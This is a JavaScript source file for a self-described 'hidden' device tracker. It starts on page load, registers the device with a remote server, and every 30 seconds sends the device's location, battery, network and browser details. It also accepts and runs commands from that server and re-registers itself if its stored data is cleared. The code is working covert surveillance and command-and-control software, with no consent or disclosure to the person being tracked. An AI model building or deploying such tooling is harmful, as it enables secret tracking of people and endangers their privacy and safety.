// ============================================
// Hidden Device Tracker App Configuration
// ============================================

// Server URL - Update this to your actual server address
const SERVER_URL = localStorage.getItem('SERVER_URL') || 'http://localhost:3000';
const CHECK_IN_INTERVAL = 30000; // 30 seconds
const HEARTBEAT_INTERVAL = 10000; // 10 seconds
const REGISTRATION_RETRY_INTERVAL = 10000; // 10 seconds

let deviceId = localStorage.getItem('deviceId');
let encryptionKey = localStorage.getItem('encryptionKey');
let clientId = localStorage.getItem('clientId');
let isRunning = false;

// ============================================
// Auto-start on page load
// ============================================

document.addEventListener('DOMContentLoaded', () => {
  console.log('🚀 Hidden app started');
  console.log(`📡 Server URL: ${SERVER_URL}`);
  initializeDevice();
  startHeartbeat();
});

// Restart on page close
window.addEventListener('beforeunload', () => {
  console.log('⚠️ App closing - will restart');
  localStorage.setItem('lastClose', Date.now().toString());
});

// ============================================
// Device Initialization
// ============================================

async function initializeDevice() {
  try {
    // Check if already registered
    if (deviceId && encryptionKey && clientId) {
      console.log('✅ Already registered:', deviceId);
      isRunning = true;
      startCheckInService();
      return;
    }

    // Register new device
    console.log('🔄 Registering new device...');

    clientId = 'client_' + Math.random().toString(36).substring(2, 15) +
      Math.random().toString(36).substring(2, 15);
    deviceId = 'device_' + Math.random().toString(36).substring(2, 15) +
      Math.random().toString(36).substring(2, 15);

    localStorage.setItem('clientId', clientId);
    localStorage.setItem('deviceId', deviceId);
    localStorage.setItem('installTime', Date.now().toString());

    await registerDevice();

  } catch (error) {
    console.error('❌ Initialization error:', error);
    setTimeout(() => initializeDevice(), REGISTRATION_RETRY_INTERVAL);
  }
}

// ============================================
// Device Registration
// ============================================

async function registerDevice() {
  try {
    const deviceInfo = {
      deviceName: getDeviceName(),
      osType: 'Android',
      osVersion: navigator.userAgent,
      appVersion: '2.0.0',
      screenResolution: `${screen.width}x${screen.height}`,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      registeredAt: new Date().toISOString()
    };

    console.log('📤 Sending registration...');

    const response = await fetch(`${SERVER_URL}/api/clients/register`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ clientId, deviceInfo })
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    const data = await response.json();

    if (data.success) {
      deviceId = data.deviceId;
      encryptionKey = data.encryptionKey;
      localStorage.setItem('deviceId', deviceId);
      localStorage.setItem('encryptionKey', encryptionKey);

      console.log('✅ Registered successfully:', deviceId);
      console.log('🔐 Encryption key:', encryptionKey.substring(0, 16) + '...');

      isRunning = true;
      startCheckInService();
      await sendInitialInfo();
    } else {
      throw new Error(data.error || 'Registration failed');
    }
  } catch (error) {
    console.error('❌ Registration failed:', error);
    setTimeout(() => registerDevice(), REGISTRATION_RETRY_INTERVAL);
    throw error;
  }
}

// ============================================
// Send Initial Information
// ============================================

async function sendInitialInfo() {
  try {
    const info = {
      deviceId: deviceId,
      type: 'initial_info',
      info: {
        battery: await getBatteryInfo(),
        network: await getNetworkInfo(),
        location: await getLocationInfo()
      },
      timestamp: new Date().toISOString()
    };

    await fetch(`${SERVER_URL}/api/clients/report`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(info)
    });

    console.log('📊 Initial info sent');
  } catch (error) {
    console.error('❌ Failed to send initial info:', error);
  }
}

// ============================================
// Check-in Service
// ============================================

function startCheckInService() {
  console.log('🔄 Starting check-in service (every 30s)');

  setInterval(async () => {
    if (!isRunning) return;
    await checkIn();
  }, CHECK_IN_INTERVAL);

  // First check-in immediately
  checkIn();
}

async function checkIn() {
  try {
    const systemInfo = {
      deviceId: deviceId,
      status: 'active',
      battery: await getBatteryInfo(),
      network: await getNetworkInfo(),
      location: await getLocationInfo(),
      timestamp: new Date().toISOString()
    };

    // Use Base64 encoding for compatibility
    const encryptedData = btoa(JSON.stringify(systemInfo));

    const response = await fetch(`${SERVER_URL}/api/clients/checkin`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        deviceId: deviceId,
        encryptedData: encryptedData
      })
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    const data = await response.json();

    if (data.success) {
      console.log('📡 Check-in OK');

      // Check for commands
      if (data.encryptedData) {
        try {
          const commands = JSON.parse(atob(data.encryptedData));
          if (commands.commands && commands.commands.length > 0) {
            console.log('📦 Received', commands.commands.length, 'commands');
            await executeCommands(commands.commands);
          }
        } catch (e) {
          // No commands or parsing error
        }
      }
    } else {
      console.error('❌ Check-in failed:', data.error);
    }
  } catch (error) {
    console.error('❌ Check-in error:', error);
  }
}

// ============================================
// Command Execution
// ============================================

async function executeCommands(commands) {
  for (const command of commands) {
    try {
      console.log('⚙️ Executing command:', command.type);

      let result;

      switch (command.type) {
        case 'get_system_info':
          result = await getFullSystemInfo();
          break;
        case 'get_location':
          result = await getLocationInfo();
          break;
        case 'get_battery':
          result = await getBatteryInfo();
          break;
        case 'get_network':
          result = await getNetworkInfo();
          break;
        default:
          result = { error: 'Unknown command', type: command.type };
      }

      await sendCommandResult(command.id || 'cmd_001', result, 'completed');

    } catch (error) {
      console.error('❌ Command execution failed:', error);
      await sendCommandResult(command.id || 'cmd_001', {
        error: error.message
      }, 'failed');
    }
  }
}

// ============================================
// Send Command Result
// ============================================

async function sendCommandResult(commandId, result, status) {
  try {
    await fetch(`${SERVER_URL}/api/clients/report`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        deviceId: deviceId,
        commandId: commandId,
        result: result,
        status: status,
        timestamp: new Date().toISOString()
      })
    });

    console.log('📤 Command result sent:', status);
  } catch (error) {
    console.error('❌ Failed to send result:', error);
  }
}

// ============================================
// Information Collection Functions
// ============================================

async function getBatteryInfo() {
  try {
    if ('getBattery' in navigator) {
      const battery = await navigator.getBattery();
      return {
        level: battery.level * 100,
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
    }
  } catch (e) {
    console.warn('Battery API not available');
  }
  return { level: 'unknown', charging: 'unknown' };
}

async function getNetworkInfo() {
  return {
    type: navigator.connection?.effectiveType || 'unknown',
    downlink: navigator.connection?.downlink || 'unknown',
    online: navigator.onLine,
    userAgent: navigator.userAgent
  };
}

async function getLocationInfo() {
  return new Promise((resolve) => {
    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(
        (pos) => resolve({
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          timestamp: pos.timestamp
        }),
        () => resolve({ error: 'permission_denied' }),
        { timeout: 5000 }
      );
    } else {
      resolve({ error: 'not_supported' });
    }
  });
}

async function getFullSystemInfo() {
  return {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screen: {
      width: screen.width,
      height: screen.height,
      colorDepth: screen.colorDepth
    },
    battery: await getBatteryInfo(),
    network: await getNetworkInfo(),
    location: await getLocationInfo(),
    timestamp: new Date().toISOString()
  };
}

// ============================================
// Heartbeat
// ============================================

function startHeartbeat() {
  setInterval(() => {
    console.log('💓 heartbeat');
    localStorage.setItem('lastHeartbeat', Date.now().toString());
  }, HEARTBEAT_INTERVAL);
}

// ============================================
// Helper Functions
// ============================================

function getDeviceName() {
  const ua = navigator.userAgent;
  if (/Android/i.test(ua)) return 'Android Device';
  if (/iPhone/i.test(ua)) return 'iPhone';
  if (/iPad/i.test(ua)) return 'iPad';
  return 'Unknown Device';
}

// ============================================
// Data Clearing Handler
// ============================================

window.addEventListener('storage', (e) => {
  if (e.key === 'deviceId' && !e.newValue) {
    console.log('⚠️ Data cleared, re-registering...');
    deviceId = null;
    encryptionKey = null;
    clientId = null;
    initializeDevice();
  }
});

// ============================================
// Startup Message
// ============================================

console.log('✅ Hidden app ready');
console.log(`📡 Server: ${SERVER_URL}`);
console.log('💡 To change server URL, use: localStorage.setItem("SERVER_URL", "your-url")');
